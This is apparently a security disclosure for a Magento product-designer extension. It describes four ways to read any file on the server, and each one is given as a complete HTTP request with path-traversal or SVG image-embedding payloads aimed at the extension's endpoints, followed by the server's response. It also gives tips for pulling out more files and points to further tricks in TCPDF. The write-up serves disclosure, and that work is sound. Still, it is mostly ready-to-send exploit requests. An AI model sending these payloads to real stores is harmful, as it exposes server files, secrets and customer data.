# Read files from the server

The extension contains several vulnerabilities that allow reading and disclosure of any files on the server that can be read by the webserver/PHP user.

## Method 1: read multiple files, conveniently packed into a zip archive

### Request:
```
POST https://testing.local.tld/pdp/print/downloadPngBg/ HTTP/1.1
Content-Type: multipart/form-data; boundary=-------------------------acebdf13572468

---------------------------acebdf13572468
Content-Disposition: form-data; name="order_id"

1000
---------------------------acebdf13572468
Content-Disposition: form-data; name="type"

any
---------------------------acebdf13572468
Content-Disposition: form-data; name="images"

["../../../../../../../../../../../tmp/foo.php"]
---------------------------acebdf13572468--
```

### Response body (JSON):
```
{"status":"download","path":"https:\/\/testing.local.tld\/media\/\/pdp\/export\/order_1000\/order_1000_any_files.zip"}
```

The linked ZIP file contains all the files passed in the request. The filenames contain those leading `../../..`, so extracting them can be tricky.

The generated ZIP file is never deleted, and is not overwritten if it exists. So `order_id` or `type` should be varied to get more files in subsequent requests. 

---

## Method 2: read multiple files, base64-encoded and embedded into an XML file

### Request:
```
POST https://testing.local.tld/pdp/index/saveAndCreateSvg/ HTTP/1.1
Content-Type: multipart/form-data; boundary=-------------------------acebdf13572468

---------------------------acebdf13572468
Content-Disposition: form-data; name="svg_string"

<svg width="100%" height="100%" viewBox="0 0 100 100"
     xmlns="http://www.w3.org/2000/svg" 
     xmlns:xlink="http://www.w3.org/1999/xlink">       
<box>
  <image xlink:href="../../../../../../../../../tmp/foo.php" x="0" y="0"
      height="100" width="100" />    
</box>
</svg>
---------------------------acebdf13572468
Content-Disposition: form-data; name="order_info[side_label]"

any
---------------------------acebdf13572468
Content-Disposition: form-data; name="order_info[increment_id]"

any
---------------------------acebdf13572468
Content-Disposition: form-data; name="order_info[order_id]"

any
---------------------------acebdf13572468
Content-Disposition: form-data; name="order_info[item_id]"

any
---------------------------acebdf13572468--
```

### Response body (JSON)
```
{"status":"success","message":"Image have been successfully saved!","thumbnail_path":"https:\/\/testing.local.tld\/media\/pdp\/export\/svg\/Design-any-Order-any-Item-any-1479932459.svg","file_location":"\/var\/www\/testing.local.tld\/web\/media\/pdp\/export\/svg\/Design-any-Order-any-Item-any-1479932459.svg"}
```

The extension tries to embed all files referenced via `<image xlink:href="" />`.
These referenced filenames are not restricted, so it will read any file on the server, 
and the href will be replaced with a data-URI for the content of that file.

Note: the sent SVG does not need to be a valid *SVG*, 
it just needs to be valid XML that `simplexml_load_string` can parse.
There needs to be one container element between the XML root element and the `<image>` element.

**Note**: A similar endpoint exists that does the same thing and then converts the generated SVG to PDF using TCPDF,
it is possible that TCPDF's SVG embed functionality has some other useful tricks.

## Method 3: read single file

### Request:
```
POST https://testing.local.tld/pdp/template/getDesignContent/ HTTP/1.1
Content-Type: multipart/form-data; boundary=-------------------------acebdf13572468

---------------------------acebdf13572468
Content-Disposition: form-data; name="json_filename"

/../../../../../../../../../tmp/foo.php
---------------------------acebdf13572468--
```

### Response
The contents of the file.

Filename is interpreted as relative to Magento's `media/pdp/json/` directory.

## Method 4: read single file

### Request:
```
POST https://testing.local.tld/pdp/index/downloadAfterCreate/ HTTP/1.1
Content-Type: multipart/form-data; boundary=-------------------------acebdf13572468

---------------------------acebdf13572468
Content-Disposition: form-data; name="file-name"

/../../../../../../../../../tmp/foo.php
---------------------------acebdf13572468
Content-Disposition: form-data; name="type"

png
---------------------------acebdf13572468--
```

### Response:
The contents of the file.

Filename is interpreted as relative to Magento's `media/pdp/export/<type>/` directory.
